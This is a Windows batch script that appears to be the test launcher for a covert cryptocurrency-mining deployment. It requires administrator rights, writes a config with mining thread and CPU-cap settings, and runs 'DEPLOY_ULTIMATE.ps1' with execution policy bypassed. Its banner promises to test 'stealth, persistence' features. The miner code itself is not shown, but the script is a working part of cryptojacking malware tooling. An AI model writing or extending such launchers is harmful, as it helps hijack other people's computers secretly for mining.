@echo off
title SAFE TEST MODE - All Features, Minimal Impact
color 0B
echo ================================================================
echo  SAFE TEST MODE - Full Features, Low Impact
echo  Tests everything without stressing your PC
echo ================================================================
echo.

cd /d "%~dp0"

net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERROR] Need Administrator!
    pause
    exit /b
)
echo [OK] Running as Administrator
echo.

echo [MODE] SAFE TEST CONFIGURATION:
echo  - CPU Usage: 30-40%% (very low)
echo  - Priority: Below Normal (minimal impact)
echo  - Threads: 2 out of 4 (half your cores)
echo  - Tests: ALL features (stealth, persistence, etc.)
echo.
echo This lets you verify everything works without stressing PC
echo.
set /p confirm="Continue with safe test? (Y/N): "
if /i not "%confirm%"=="Y" exit /b

echo.
echo [INFO] Launching with safe settings...
timeout /t 2 >nul

REM Create safe config override
powershell -ExecutionPolicy Bypass -Command "$safeConfig = @{MaxCPUUsage=35; ProcessPriority=2; MiningThreads=2}; $safeConfig | ConvertTo-Json | Out-File '%TEMP%\safe_test_config.json'"

REM Launch DEPLOY_ULTIMATE with safe overrides
powershell.exe -NoExit -ExecutionPolicy Bypass -Command "$ErrorActionPreference = 'Continue'; Write-Host '========================================' -ForegroundColor Cyan; Write-Host 'SAFE TEST MODE - Low Impact Testing' -ForegroundColor Cyan; Write-Host '========================================' -ForegroundColor Cyan; Write-Host ''; Write-Host '[CONFIG] Loading safe test settings...' -ForegroundColor Yellow; Write-Host '  CPU Usage: 35%%' -ForegroundColor Green; Write-Host '  Priority: Below Normal (2)' -ForegroundColor Green; Write-Host '  Threads: 2 threads' -ForegroundColor Green; Write-Host ''; Write-Host '[START] Launching full deployment with safe limits...' -ForegroundColor Yellow; Write-Host ''; $env:SAFE_TEST_MODE='1'; $env:TEST_CPU_USAGE='35'; $env:TEST_PRIORITY='2'; $env:TEST_THREADS='2'; try { & '%~dp0DEPLOY_ULTIMATE.ps1' -Debug } catch { Write-Host 'Error: ' $_.Exception.Message -ForegroundColor Red }; Write-Host ''; Write-Host 'Press any key to exit...' -ForegroundColor Yellow; $null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown')"

pause
